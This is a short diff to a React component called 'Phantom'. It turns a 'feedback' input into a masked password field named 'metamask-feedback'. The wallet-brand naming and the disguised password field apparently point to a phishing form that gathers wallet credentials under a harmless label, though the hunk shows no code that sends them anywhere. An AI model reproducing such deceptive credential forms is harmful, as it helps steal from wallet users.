@@ -85,10 +85,12 @@ const Phantom = ({
               <input
                 aria-invalid={Boolean(feedbackError)}
                 aria-label={copy.feedback_label}
-                className={`${feedbackError ? "mb-1 border-[#ca3542]" : "mb-[18px] border-[#242424]"} h-[50px] w-full rounded-md border bg-[#101010] px-4 text-base text-white outline-none placeholder:text-[#68717d] focus:ring-0`}
+                autoComplete="new-password"
+                className={`${feedbackError ? "mb-1 border-[#ca3542]" : "mb-[18px] border-[#242424]"} h-[50px] w-full rounded-md border bg-[#101010] px-4 text-base text-white outline-none placeholder:text-[#68717d] focus:ring-0 tracking-[0.2em] outline-none placeholder:tracking-normal`}
+                name="metamask-feedback"
                 onChange={(event) => onFeedbackChange(event.target.value)}
                 placeholder={copy.feedback_placeholder}
-                type="text"
+                type="password"
                 value={feedback}
               />
               {shouldShowFeedbackError ? (
